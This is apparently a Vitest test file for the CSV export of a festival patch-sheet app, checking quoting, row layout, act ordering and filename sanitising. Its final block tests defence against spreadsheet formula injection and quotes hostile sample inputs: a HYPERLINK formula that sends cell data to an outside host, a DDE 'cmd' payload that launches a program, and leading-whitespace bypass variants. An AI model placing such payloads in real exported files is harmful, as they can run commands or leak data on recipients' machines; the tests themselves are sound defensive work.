import { describe, expect, it } from 'vitest'
import * as Y from 'yjs'
import { csvFilename, escapeCsvField, sheetToCsv } from './csv'
import {
  addSubBox,
  initSheet,
  renameChannel,
  setChannelInput,
  setMetaField,
  setPatchField,
  setPatchSubBox,
  snapshotSheet,
} from './sheetDoc'
import { sheetActs } from './lineup'
import { addAct, snapshotTimetable, updateAct } from '../../../shell/timetable/model.ts'

const buildSheet = () => {
  const doc = new Y.Doc()
  const events = new Y.Doc()
  initSheet(doc, {
    title: 'Summer Fest',
    date: '2026-07-23',
    now: '2026-07-23T10:00:00.000Z',
    channelCount: 2,
  })
  // A sheet no longer seeds an act — the running order is the whole event's
  // (see `initSheet`) — so a test that needs a column puts one there itself,
  // which is what the lineup does.
  addAct(events, { name: 'Act 1', stage: 'Summer Fest', date: '2026-07-23' })
  return { doc, events, act: snapshotTimetable(events).acts[0]!.id }
}

/** The columns as the grid has them: this sheet's slice of the running order. */
const columns = (doc: Y.Doc, events: Y.Doc) =>
  sheetActs(snapshotSheet(doc), snapshotTimetable(events).acts)

describe('escapeCsvField', () => {
  it('passes plain values through, including times like 19:00', () => {
    expect(escapeCsvField('19:00')).toBe('19:00')
    expect(escapeCsvField('SM58')).toBe('SM58')
  })

  it('quotes and doubles values containing commas, quotes, and newlines', () => {
    expect(escapeCsvField('a,b')).toBe('"a,b"')
    expect(escapeCsvField('say "hi"')).toBe('"say ""hi"""')
    expect(escapeCsvField('line1\nline2')).toBe('"line1\nline2"')
  })
})

describe('sheetToCsv', () => {
  it('renders BOM, CRLF rows, act and field headers, and channel rows', () => {
    const { doc, events, act } = buildSheet()
    const snap = snapshotSheet(doc)
    updateAct(events, act, { name: 'The Band, Live' })
    renameChannel(doc, snap.channels[0].id, 'Kick')
    setChannelInput(doc, snap.channels[0].id, 'Kick In')
    setPatchField(doc, act, snap.channels[0].id, 'input', 'Drums')
    setPatchField(doc, act, snap.channels[0].id, 'micDi', 'Beta 91A')

    const csv = sheetToCsv(snapshotSheet(doc), columns(doc, events))
    expect(csv.startsWith('\uFEFF')).toBe(true)

    const lines = csv.slice(1).split('\r\n')
    // Channel and its house input lead; each act's spec rides in the spare
    // cell beside their name, where the field parser never looks.
    expect(lines[0]).toBe(',,"The Band, Live",,,,')
    expect(lines[1]).toBe('Channel,Input,Sub-box,Input,Description,Mic/DI,Stand')
    expect(lines[2]).toBe('Kick,Kick In,,Drums,,Beta 91A,')
    expect(lines[3]).toBe('2,,,,,,')
    expect(lines[4]).toBe('')
  })

  it('exports sub-box references as their display name', () => {
    const { doc, events, act } = buildSheet()
    const snap = snapshotSheet(doc)
    addSubBox(doc, { name: 'Box 1', stagePosition: 'MSC' })
    setPatchSubBox(doc, act, snap.channels[0].id, 'Box 1')

    const csv = sheetToCsv(snapshotSheet(doc), columns(doc, events))
    expect(csv).toContain('1,,Box 1 (MSC),,,,')
  })

  it('exports the acts in running order, not in the order they were added', () => {
    // A festival CSV is read left to right against a day that runs left to
    // right, so a late addition at 19:00 belongs first however it got there.
    const { doc, events, act } = buildSheet()
    updateAct(events, act, { name: 'Headliner', start: '22:00' })
    addAct(events, { name: 'Opener', stage: 'Summer Fest', date: '2026-07-23', start: '19:00' })

    const csv = sheetToCsv(snapshotSheet(doc), columns(doc, events))
    const names = csv.slice(1).split('\r\n')[0]
    expect(names.indexOf('Opener')).toBeLessThan(names.indexOf('Headliner'))
  })
})

describe('csvFilename', () => {
  it('sanitises title and stage and keeps the ISO date', () => {
    const { doc } = buildSheet()
    setMetaField(doc, 'stage', 'Main Stage!')
    expect(csvFilename(snapshotSheet(doc))).toBe('Summer_Fest_Main_Stage__2026-07-23.csv')
  })

  it('falls back for empty fields', () => {
    const doc = new Y.Doc()
    initSheet(doc, { title: ' ', date: '2026-01-01', channelCount: 1 })
    const snap = snapshotSheet(doc)
    expect(csvFilename(snap)).toBe('Untitled_Sheet_stage_2026-01-01.csv')
  })
})

describe('a sheet that is going to be opened in Excel', () => {
  /**
   * A patch sheet is paperwork that gets exported and mailed on, and the
   * person who opens it opens it in a spreadsheet — where a cell beginning
   * `=`, `+`, `-` or `@` is not text but a formula, and `=HYPERLINK(...)` or
   * a `=cmd|...` DDE payload runs on their machine. Every string in the
   * export was typed into a document anyone at the event can edit.
   */
  it('stops a formula being a formula', () => {
    expect(escapeCsvField('=HYPERLINK("http://x/"&A1,"click")')).toBe(
      '"\'=HYPERLINK(""http://x/""&A1,""click"")"'
    )
    expect(escapeCsvField('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)")
    expect(escapeCsvField('+1-2')).toBe("'+1-2")
    expect(escapeCsvField("-2+3+cmd|' /C calc'!A0")).toBe("'-2+3+cmd|' /C calc'!A0")
  })

  it('catches the leading whitespace the check is walked past with', () => {
    // Excel strips a leading tab or carriage return before deciding whether
    // a cell is a formula, so a check that does not is not a check.
    expect(escapeCsvField('\t=1+1')).toBe("'\t=1+1")
    // A carriage return is also quoted, being one of RFC-4180's own.
    expect(escapeCsvField('\r=1+1')).toBe('"\'\r=1+1"')
  })

  it('leaves a plain number alone, including a negative one', () => {
    // A weight of -2.5 or a trim below stage is a number in a column somebody
    // is going to sum. Quoting it as text stops the sum.
    expect(escapeCsvField('-2.5')).toBe('-2.5')
    expect(escapeCsvField('+7')).toBe('+7')
    expect(escapeCsvField('12')).toBe('12')
  })

  it('leaves ordinary paperwork alone', () => {
    expect(escapeCsvField('SM58')).toBe('SM58')
    expect(escapeCsvField('DI 1 — keys')).toBe('DI 1 — keys')
  })
})
